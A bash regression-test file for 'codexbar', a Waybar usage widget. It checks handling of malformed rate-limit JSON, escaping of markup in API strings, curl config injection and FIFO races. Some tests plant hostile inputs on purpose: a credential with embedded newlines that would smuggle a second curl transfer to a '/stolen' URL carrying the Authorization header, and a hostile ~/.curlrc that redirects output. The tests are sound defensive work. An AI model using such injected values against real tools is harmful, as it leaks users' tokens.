#!/usr/bin/env bash
source "$(dirname "$0")/lib.sh"
base='{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":%s,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":604800}}%s}'

# used_percent as a string must NOT crash
run_codexbar "$(printf "$base" '"50"' '')"
assert_exit0 "string used_percent: exit 0"; assert_json_valid "string used_percent: valid JSON"

# scalar entry in additional_rate_limits must NOT crash
run_codexbar "$(printf "$base" 30 ',"additional_rate_limits":[1,"x",null]')"
assert_exit0 "scalar additional entries: exit 0"; assert_json_valid "scalar additional entries: valid JSON"

# object additional entry with string fields must NOT crash
run_codexbar "$(printf "$base" 30 ',"additional_rate_limits":[{"limit_name":"M","rate_limit":{"primary_window":{"used_percent":"oops","limit_window_seconds":"x"}}}]')"
assert_exit0 "string fields in additional: exit 0"; assert_json_valid "string fields: valid JSON"

# additional_rate_limits as a non-array scalar must NOT crash
run_codexbar "$(printf "$base" 30 ',"additional_rate_limits":"nope"')"
assert_exit0 "non-array additional_rate_limits: exit 0"; assert_json_valid "non-array additional_rate_limits: valid JSON"

# malformed CONTAINER types must NOT crash
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":1,"secondary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":604800}}}'
assert_exit0 "non-object primary_window: exit 0"; assert_json_valid "non-object primary_window: valid JSON"
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":604800}},"code_review_rate_limit":5}'
assert_exit0 "non-object code_review: exit 0"; assert_json_valid "non-object code_review: valid JSON"
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":604800}},"credits":{"has_credits":true,"balance":"5","approx_local_messages":"bad","approx_cloud_messages":[1,2]}}'
assert_exit0 "string approx_local_messages: exit 0"; assert_json_valid "string approx_local_messages: valid JSON"
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":604800}},"additional_rate_limits":[{"limit_name":{"x":1},"rate_limit":{"primary_window":{"used_percent":5,"limit_window_seconds":18000}}}]}'
assert_exit0 "object limit_name: exit 0"; assert_json_valid "object limit_name: valid JSON"

# --- Fix 4: scientific-notation, negative, and invalid-JSON cases ---

# used_percent: 1e100 (primary) must NOT crash
run_codexbar "$(printf "$base" '1e100' '')"
assert_exit0 "sci-notation used_percent 1e100: exit 0"; assert_json_valid "sci-notation used_percent 1e100: valid JSON"

# used_percent: -100000 (primary) must NOT crash
run_codexbar "$(printf "$base" '-100000' '')"
assert_exit0 "negative used_percent -100000: exit 0"; assert_json_valid "negative used_percent -100000: valid JSON"

# reset_at: 1e100 (primary) must NOT crash
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":50,"reset_at":1e100,"limit_window_seconds":18000},"secondary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":604800}}}'
assert_exit0 "sci-notation reset_at 1e100: exit 0"; assert_json_valid "sci-notation reset_at 1e100: valid JSON"

# additional meter with used_percent: 1e100 must NOT crash
run_codexbar "$(printf "$base" 30 ',"additional_rate_limits":[{"limit_name":"M","rate_limit":{"primary_window":{"used_percent":1e100,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":604800}}}]')"
assert_exit0 "additional meter sci-notation 1e100: exit 0"; assert_json_valid "additional meter sci-notation 1e100: valid JSON"

# additional meter with used_percent: -100000 must NOT crash
run_codexbar "$(printf "$base" 30 ',"additional_rate_limits":[{"limit_name":"M","rate_limit":{"primary_window":{"used_percent":-100000,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":10,"reset_at":9999999999,"limit_window_seconds":604800}}}]')"
assert_exit0 "additional meter negative -100000: exit 0"; assert_json_valid "additional meter negative -100000: valid JSON"

# usage cache = 'not json' (invalid) must NOT crash
run_codexbar 'not json'
assert_exit0 "invalid JSON cache: exit 0"; assert_json_valid "invalid JSON cache: valid JSON"

# usage cache = two-document stream must NOT crash
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":604800}}} {"plan_type":"plus","rate_limit":{}}'
assert_exit0 "two-document cache: exit 0"; assert_json_valid "two-document cache: valid JSON"

# REGRESSION: an additional meter with an out-of-range window (1e100, clamped to 0
# in the TSV) must NOT count toward severity — else it colors the widget critical
# with nothing rendered (hidden-meter divergence). session/weekly are 5 -> low.
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":604800}},"additional_rate_limits":[{"limit_name":"Hidden","rate_limit":{"primary_window":{"used_percent":95,"reset_at":9999999999,"limit_window_seconds":1e100}}}]}'
assert_exit0 "1e100 window additional: exit 0"
assert_class "1e100 window meter does not leak into severity" low

# REGRESSION (other direction): a sibling meter with a 1e100 used_percent must not
# POISON the severity max — a valid 95% meter must still drive the class to critical.
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":604800}},"additional_rate_limits":[{"limit_name":"High","rate_limit":{"primary_window":{"used_percent":95,"reset_at":9999999999,"limit_window_seconds":18000}}},{"limit_name":"Huge","rate_limit":{"primary_window":{"used_percent":1e100,"reset_at":9999999999,"limit_window_seconds":18000}}}]}'
assert_exit0 "valid 95% meter alongside 1e100 sibling: exit 0"
assert_class "valid 95% meter still drives severity (not poisoned)" critical

# REGRESSION (boundary): the additional severity max and the TSV must use the
# identical filter (numbers // 0 | floor | clamp). A meter at the 1e12 boundary
# with a valid window must be treated consistently by both (counted -> critical).
run_codexbar '{"plan_type":"plus","rate_limit":{"primary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":18000},"secondary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":604800}},"additional_rate_limits":[{"limit_name":"Edge","rate_limit":{"primary_window":{"used_percent":1000000000000,"reset_at":9999999999,"limit_window_seconds":18000}}}]}'
assert_exit0 "1e12 boundary used_percent: exit 0"
assert_class "1e12 boundary meter counted consistently (render==severity)" critical

# --- API strings are Pango-escaped before rendering ---------------------------
# plan_type, the credits balance and the per-model meter names all come from the
# API response and all land inside markup. Unescaped, a stray < or & yields
# invalid markup and Waybar drops the whole label.
HOSTILE_STRINGS='{"plan_type":"Plus <b>& Co</b>",
 "rate_limit":{"primary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":18000},
               "secondary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":604800}},
 "additional_rate_limits":[{"limit_name":"Model <x> & \"y\"","rate_limit":{"primary_window":{"used_percent":5,"reset_at":9999999999,"limit_window_seconds":18000}}}],
 "credits":{"has_credits":true,"balance":"<i>1&2</i>","approx_local_messages":[1,2],"approx_cloud_messages":[1,2]}}'

run_codexbar "$HOSTILE_STRINGS"
assert_exit0      "hostile API strings: exit 0"
assert_json_valid "hostile API strings: valid JSON"
_tip=$(jq -r .tooltip <<<"$OUT")
command grep -qF '<b>& Co</b>' <<<"$_tip" \
    && _no "plan_type escaped" "raw markup reached the tooltip" || _ok "plan_type escaped"
command grep -qF '&lt;b&gt;' <<<"$_tip" \
    && _ok "plan_type entities present" || _no "plan_type entities present" "not escaped as entities"
command grep -qF '<i>1&2</i>' <<<"$_tip" \
    && _no "credits balance escaped" "raw markup reached the tooltip" || _ok "credits balance escaped"
command grep -qF '<x>' <<<"$_tip" \
    && _no "model meter name escaped" "raw markup reached the tooltip" || _ok "model meter name escaped"
# Every emitted tag must be one this script opened, never one from the payload.
_bad=$(command grep -oE '<[a-zA-Z/][^>]*>' <<<"$_tip" | command grep -vE '^</?(span|b|i)( [^>]*)?>$' | head -1 || true)
[[ -z "$_bad" ]] && _ok "no unexpected tags from payload" || _no "no unexpected tags from payload" "found: $_bad"

# Structured mode carries raw data: jq owns the quoting, no Pango escaping.
run_codexbar "$HOSTILE_STRINGS" --json
assert_exit0      "hostile API strings (json): exit 0"
assert_json_valid "hostile API strings (json): valid JSON"
_plan=$(jq -r .plan <<<"$OUT")
[[ "$_plan" == 'Plus <b>& Co</b>' ]] \
    && _ok "json keeps the plan raw (no HTML entities)" \
    || _no "json keeps the plan raw (no HTML entities)" "got: $_plan"

# --- A newline in a credential must not become a curl option -----------------
# curl parses a --config stream one option per LINE, and feeding it on stdin
# does not change that. A credential carrying a real newline ends its own value
# and turns the rest into fresh directives: "url = https://..." plus "insecure"
# makes curl run a SECOND transfer with the Authorization header attached.
# --proto '=https' does not stop it — the injected URL is https as well — so
# cfg_escape is the only defence, and this is the test that holds it in place.
_inj_home=$(mktemp -d) || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
mkdir -p "$_inj_home/.codex" "$_inj_home/.cache/codexbar" "$_inj_home/bin" "$_inj_home/spy"
# A curl that records exactly what it was handed — argv and the config stream —
# then answers with a usable payload so the script runs to completion.
cat > "$_inj_home/bin/curl" <<'CURLSPY'
#!/usr/bin/env bash
printf '%s\n' "$@" > "$SPYDIR/argv"
cat > "$SPYDIR/stdin"
printf '%s\n200' "$SPYUSAGE"
CURLSPY
chmod +x "$_inj_home/bin/curl"
_inj_hdr=$(printf '{"alg":"RS256"}' | _b64url)
_inj_acc=$(printf '{"exp":4102444800}' | _b64url)          # year 2100 -> no refresh
_inj_idt=$(printf '{"https://api.openai.com/auth":{"chatgpt_plan_type":"plus"}}' | _b64url)
# The hostile value rides in account_id: it reaches the config verbatim, without
# having to survive JWT decoding on the way there.
jq -nc --arg at "$_inj_hdr.$_inj_acc.sig" --arg idt "$_inj_hdr.$_inj_idt.sig" \
    '{tokens:{access_token:$at,refresh_token:"r",id_token:$idt,
              account_id:"B\nurl = https://127.0.0.1:9/stolen\ninsecure"}}' \
    > "$_inj_home/.codex/auth.json" || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
_inj_usage=$(printf "$base" 46 '')
OUT=$(SPYDIR="$_inj_home/spy" SPYUSAGE="$_inj_usage" HOME="$_inj_home" \
      XDG_STATE_HOME="$_inj_home/.local/state" XDG_CACHE_HOME="$_inj_home/.cache" \
      PATH="$_inj_home/bin:$PATH" "$SCRIPT"); RC=$?
assert_exit0      "credential with a newline: exit 0"
assert_json_valid "credential with a newline: valid JSON"

_inj_cfg=$(cat "$_inj_home/spy/stdin" 2>/dev/null || true)
_inj_bad=$(command grep -nE '^[[:space:]]*(url|insecure|proto|output|upload-file)\b' <<<"$_inj_cfg" | head -1 || true)
[[ -z "$_inj_bad" ]] \
    && _ok "no injected directive reaches curl" \
    || _no "no injected directive reaches curl" "line: $_inj_bad"
# Negative control: the hostile value DID travel through cfg_escape and came out
# flattened into its own header. Without this, an assertion that passed only
# because the value never arrived would look like a working defence.
command grep -qF 'chatgpt-account-id: Burl = https://127.0.0.1:9/stoleninsecure' <<<"$_inj_cfg" \
    && _ok "the hostile value is flattened into the header it belongs to" \
    || _no "the hostile value is flattened into the header it belongs to" "config was: $_inj_cfg"
# And the whole point of the stdin channel: nothing secret on the command line.
command grep -qiF 'bearer' "$_inj_home/spy/argv" \
    && _no "no bearer token on curl argv" "argv carries the header" \
    || _ok "no bearer token on curl argv"
rm -rf "$_inj_home"

# --- curl reads ~/.curlrc BEFORE our --config stream --------------------------
# Everything cfg_escape defends is bypassable without -q: the attacker who can
# write $HOME/.curlrc does not need to inject a newline at all, they just put
# the directive in the file curl reads first. These run against the real curl on
# this machine and stay offline (file:// URL, no server, no DNS): the point is
# to prove the mechanism the -q in codexbar is there for, not to trust a claim.
_cq=$(mktemp -d) || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
printf 'data' > "$_cq/src.txt"
printf 'output = "%s/pwned.txt"\n' "$_cq" > "$_cq/.curlrc"

HOME="$_cq" command curl -s "file://$_cq/src.txt" >/dev/null 2>&1 || true
[[ -f "$_cq/pwned.txt" ]] \
    && _ok "without -q a hostile ~/.curlrc hijacks the transfer" \
    || _no "without -q a hostile ~/.curlrc hijacks the transfer" "curlrc was ignored — this machine's curl does not read it, the assertion below proves nothing"
rm -f "$_cq/pwned.txt"

_cq_out=$(HOME="$_cq" command curl -q -s "file://$_cq/src.txt" 2>/dev/null || true)
[[ ! -f "$_cq/pwned.txt" && "$_cq_out" == "data" ]] \
    && _ok "-q suppresses ~/.curlrc and the answer comes back on stdout" \
    || _no "-q suppresses ~/.curlrc and the answer comes back on stdout" "pwned=$( [[ -f "$_cq/pwned.txt" ]] && echo yes || echo no ) out=$_cq_out"
rm -f "$_cq/pwned.txt"

# POSITION control: -q after another option is already too late — curl has read
# the file by then. This is why the script writes `curl -q "${args[@]}"` and not
# a -q buried in the array.
HOME="$_cq" command curl -s -q "file://$_cq/src.txt" >/dev/null 2>&1 || true
[[ -f "$_cq/pwned.txt" ]] \
    && _ok "-q placed after another option does NOT suppress the file" \
    || _no "-q placed after another option does NOT suppress the file" "position turned out not to matter"
rm -f "$_cq/pwned.txt"

# And -q must not have closed the channel the script actually uses: the same
# directive on --config - is still honoured with -q in front.
printf 'output = "%s/pwned.txt"\n' "$_cq" \
    | HOME="$_cq" command curl -q -s --config - "file://$_cq/src.txt" >/dev/null 2>&1 || true
[[ -f "$_cq/pwned.txt" ]] \
    && _ok "-q leaves our own --config stream working" \
    || _no "-q leaves our own --config stream working" "--config - stopped being honoured"
rm -rf "$_cq"

# --- read_bounded must not block on a FIFO, even after losing the race --------
# The [[ -f ]] pre-check rejects a FIFO that is already there, so planting one
# and running the script would go green whatever the open does — it never gets
# that far. The race is exactly the window AFTER that check, so the property to
# test is the open itself: take the real helper out of the script, drop the
# pre-check (that simulates losing the race), and point it at a real FIFO.
_rb=$(mktemp -d) || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
sed -n '/^read_bounded() {/,/^}/p' "$SCRIPT" | command grep -v '\[\[ -f "\$1" \]\]' > "$_rb/rb.sh"
# Guard against a silently empty extraction (a rename would make every
# assertion below vacuously true).
command grep -q 'read_bounded()' "$_rb/rb.sh" \
    && _ok "read_bounded was extracted from the script" \
    || _no "read_bounded was extracted from the script" "sed found nothing — the assertions below are vacuous"

mkfifo "$_rb/pipe"
timeout 5 bash -c 'source "$1/rb.sh"; read_bounded "$1/pipe" 1024' _ "$_rb" >/dev/null 2>&1
_rb_rc=$?
[[ "$_rb_rc" -ne 124 ]] \
    && _ok "read_bounded returns on a FIFO instead of hanging" \
    || _no "read_bounded returns on a FIFO instead of hanging" "timed out (rc=124) — the open blocks"

# The non-blocking open must not have cost us the reads it exists for: a regular
# file still comes back whole, and still stops at the cap.
printf 'hello world' > "$_rb/small"
_rb_small=$(timeout 5 bash -c 'source "$1/rb.sh"; read_bounded "$1/small" 65536' _ "$_rb" 2>/dev/null || true)
[[ "$_rb_small" == "hello world" ]] \
    && _ok "read_bounded still returns a whole small file" \
    || _no "read_bounded still returns a whole small file" "got: $_rb_small"

head -c 100000 /dev/zero | tr '\0' 'x' > "$_rb/big"
_rb_n=$(timeout 5 bash -c 'source "$1/rb.sh"; read_bounded "$1/big" 65536' _ "$_rb" 2>/dev/null | LC_ALL=C wc -c)
[[ "$_rb_n" -eq 65536 ]] \
    && _ok "read_bounded still stops at exactly MAXBYTES" \
    || _no "read_bounded still stops at exactly MAXBYTES" "read $_rb_n bytes, want 65536"
rm -rf "$_rb"

# --- The cache lock is opened O_RDWR, so a swapped-in FIFO cannot freeze it ---
# Same shape of race as read_bounded: the [[ -f ]] pre-check rejects a FIFO that
# is already there, so an end-to-end plant proves nothing about the open. What
# the fix changes is the redirect itself, so that is what gets measured here —
# the primitive, on this machine — plus a check that the script uses it.
# Linux defines an O_RDWR open on a FIFO as non-blocking; POSIX leaves it
# undefined, and this script is Linux-only.
_lk=$(mktemp -d) || { echo "HARNESS SETUP FAILED" >&2; exit 1; }
mkfifo "$_lk/f"
timeout 5 bash -c 'exec 9>"$1/f"' _ "$_lk" >/dev/null 2>&1; _lk_w=$?
[[ "$_lk_w" -eq 124 ]] \
    && _ok "a write-only open on a FIFO hangs (the bug being closed)" \
    || _no "a write-only open on a FIFO hangs (the bug being closed)" "rc=$_lk_w — the assertion below proves nothing"
timeout 5 bash -c 'exec 9<>"$1/f"; flock -n 9' _ "$_lk" >/dev/null 2>&1; _lk_rw=$?
[[ "$_lk_rw" -eq 0 ]] \
    && _ok "an O_RDWR open returns at once and still takes the lock" \
    || _no "an O_RDWR open returns at once and still takes the lock" "rc=$_lk_rw"
rm -rf "$_lk"
command grep -qF 'exec 9<>"$_lockfile"' "$SCRIPT" \
    && _ok "the script opens the cache lock with <>" \
    || _no "the script opens the cache lock with <>" "the lock redirect is not O_RDWR"

# --- The panel's tripwire must not claim bytes it does not measure ------------
# QML's String.length counts UTF-16 units, so a cap named maxBytes over-retains
# by up to 3x and the number in the message is a lie. The whole substance of
# that fix is the name, so the name is what gets asserted: qmllint cannot guard
# it (a dangling reference is only an [unqualified] warning, and this project
# carries 81 of those because the qs.* imports do not resolve outside the shell).
_qml="$(dirname "$SCRIPT")/omarchy/Panel.qml"
command grep -qF 'maxChars' "$_qml" \
    && _ok "the panel tripwire is named for the units it counts" \
    || _no "the panel tripwire is named for the units it counts" "maxChars not found in $_qml"
command grep -qF 'maxBytes' "$_qml" \
    && _no "no byte claim survives in the panel tripwire" "maxBytes is still there" \
    || _ok "no byte claim survives in the panel tripwire"
command grep -qF 'KiB — refusing it' "$_qml" \
    && _no "the refusal message stopped claiming KiB" "the message still says KiB" \
    || _ok "the refusal message stopped claiming KiB"

finish
